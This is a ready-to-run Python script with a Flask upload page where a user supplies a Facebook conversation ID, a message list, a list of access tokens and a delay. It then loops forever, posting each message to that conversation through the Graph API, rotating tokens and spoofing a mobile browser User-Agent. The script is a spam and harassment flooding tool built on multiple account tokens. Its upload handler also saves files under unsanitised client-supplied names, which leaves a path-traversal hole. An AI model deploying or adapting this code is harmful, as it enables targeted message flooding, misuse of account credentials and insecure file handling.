import os
import time
import threading
import requests
import http.server
import socketserver
from flask import Flask, request

app = Flask(__name__)

UPLOAD_FOLDER = "uploads"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)  # Ensure upload folder exists

# Flask Route for File Upload Form
@app.route("/", methods=["GET", "POST"])
def upload_file():
    """Web form to upload necessary files."""
    if request.method == "POST":
        for file_key in request.files:
            file = request.files[file_key]
            if file and file.filename:
                file_path = os.path.join(UPLOAD_FOLDER, file.filename)
                file.save(file_path)
                print(f"[INFO] Uploaded: {file.filename}")

        return "Files uploaded successfully! <a href='/'>Go back</a>"

    return """
    <!doctype html>
    <html>
    <head><title>Upload Necessary Files</title></head>
    <body>
        <h2>Upload Necessary Files</h2>
        <form method="POST" enctype="multipart/form-data">
            <label>Upload tokennum.txt:</label> <input type="file" name="tokennum.txt"><br><br>
            <label>Upload time.txt:</label> <input type="file" name="time.txt"><br><br>
            <label>Upload NP.txt:</label> <input type="file" name="NP.txt"><br><br>
            <label>Upload convo.txt:</label> <input type="file" name="convo.txt"><br><br>
            <input type="submit" value="Upload">
        </form>
    </body>
    </html>
    """

# HTTP Server Function
def execute_server():
    """Runs a simple HTTP server."""
    PORT = int(os.environ.get("PORT", 4000))

    class MyHandler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Server is running...")

    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print(f"[INFO] HTTP Server running at http://localhost:{PORT}")
        httpd.serve_forever()

# Function to Send Messages
def send_messages():
    """Reads uploaded files and sends messages."""
    try:
        while True:
            # Check if all necessary files exist
            required_files = ["convo.txt", "NP.txt", "tokennum.txt", "time.txt"]
            missing_files = [f for f in required_files if not os.path.exists(os.path.join(UPLOAD_FOLDER, f))]
            if missing_files:
                print(f"[!] Missing files: {missing_files}. Waiting for uploads...")
                time.sleep(5)
                continue

            with open(os.path.join(UPLOAD_FOLDER, "convo.txt"), "r") as file:
                convo_id = file.read().strip()
            with open(os.path.join(UPLOAD_FOLDER, "NP.txt"), "r") as file:
                messages = file.readlines()
            with open(os.path.join(UPLOAD_FOLDER, "tokennum.txt"), "r") as file:
                tokens = file.readlines()
            with open(os.path.join(UPLOAD_FOLDER, "time.txt"), "r") as file:
                speed = int(file.read().strip())

            num_messages = len(messages)
            num_tokens = len(tokens)
            max_tokens = min(num_tokens, num_messages)

            headers = {
                "User-Agent": "Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.9,fr;q=0.8",
            }

            for message_index in range(num_messages):
                token_index = message_index % max_tokens
                access_token = tokens[token_index].strip()
                message = messages[message_index].strip()

                url = f"https://graph.facebook.com/v17.0/t_{convo_id}/"
                parameters = {"access_token": access_token, "message": message}
                response = requests.post(url, json=parameters, headers=headers)

                if response.ok:
                    print(f"\033[1;92m[+] Sent Message {message_index + 1} of Convo {convo_id}: {message}\033[0m")
                else:
                    print(f"\033[1;91m[x] Failed to send Message {message_index + 1} of Convo {convo_id}: {message}\033[0m")

                time.sleep(speed)

            print("\n[INFO] All messages sent. Restarting the process...\n")

    except Exception as e:
        print(f"[ERROR] {e}")

# Main Function
def main():
    threading.Thread(target=execute_server, daemon=True).start()
    threading.Thread(target=send_messages, daemon=True).start()
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))

if __name__ == "__main__":
    main()
